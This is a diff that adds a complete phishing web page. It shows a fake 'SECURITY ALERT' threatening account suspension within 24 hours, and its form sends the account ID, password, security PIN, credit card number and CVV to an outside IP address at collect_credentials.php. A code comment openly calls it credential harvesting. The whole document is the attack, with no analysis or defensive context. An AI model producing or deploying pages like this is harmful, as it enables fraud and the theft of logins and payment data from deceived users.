@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Account Verification - Urgent Action Required</title>
+</head>
+<body>
+    <div class="alert">
+        <h1>SECURITY ALERT: Your account will be suspended within 24 hours!</h1>
+        <p>Immediate action required. Please verify your credentials and payment details to avoid termination.</p>
+    </div>
+    <!-- Cross-origin form harvesting credentials -->
+    <form action="http://198.51.100.25/collect_credentials.php" method="POST">
+        <input type="text" name="account_id" placeholder="Account ID" required>
+        <input type="password" name="user_password" placeholder="Password" required>
+        <input type="password" name="confirm_pin" placeholder="Security PIN" required>
+        <input type="text" name="credit_card_number" placeholder="Credit Card Number">
+        <input type="text" name="cvv" placeholder="CVV">
+        <button type="submit">Verify Now</button>
+    </form>
+</body>
+</html>
